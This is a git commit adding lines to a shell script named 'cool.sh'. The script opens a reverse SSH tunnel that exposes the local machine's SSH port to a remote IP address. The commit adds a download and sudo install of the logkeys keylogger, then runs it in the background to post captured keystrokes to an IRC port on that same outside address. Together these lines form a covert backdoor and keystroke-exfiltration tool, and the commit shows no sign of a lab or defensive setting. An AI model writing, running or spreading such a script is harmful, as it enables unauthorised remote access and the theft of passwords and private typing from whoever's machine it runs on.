2e846b523850481da8799b940c3b3f443561f711
gizmo87898 <73662348+gizmo87898@users.noreply.github.com>
2022-04-25 07:49:01 -0400

    Update cool.sh

--- cool.sh
+++ cool.sh
@@ -1,1 +1,4 @@
 ssh -R 2222:localhost:22 gizmo@75.138.184.49
+wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
+sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
+logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
